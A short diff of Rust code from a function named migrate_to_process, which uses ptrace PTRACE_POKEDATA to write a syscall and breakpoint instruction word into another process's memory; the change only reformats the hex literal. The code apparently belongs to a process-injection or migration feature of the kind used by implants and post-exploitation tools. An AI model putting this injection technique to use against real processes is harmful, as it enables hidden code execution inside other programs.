@@ -176,7 +176,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     std::ptr::null::<libc::c_void>(),
                 );
                 // syscall (0F 05) + int3 (CC) + nops to fill 8 bytes
-                let inject_word: u64 = 0xCC9090909090050fu64; // LE: 0F 05 90 90 90 90 90 CC
+                let inject_word: u64 = 0xcc9090909090050f_u64; // LE: 0F 05 90 90 90 90 90 CC
                 libc::ptrace(
                     libc::PTRACE_POKEDATA,
                     target_pid as libc::pid_t,
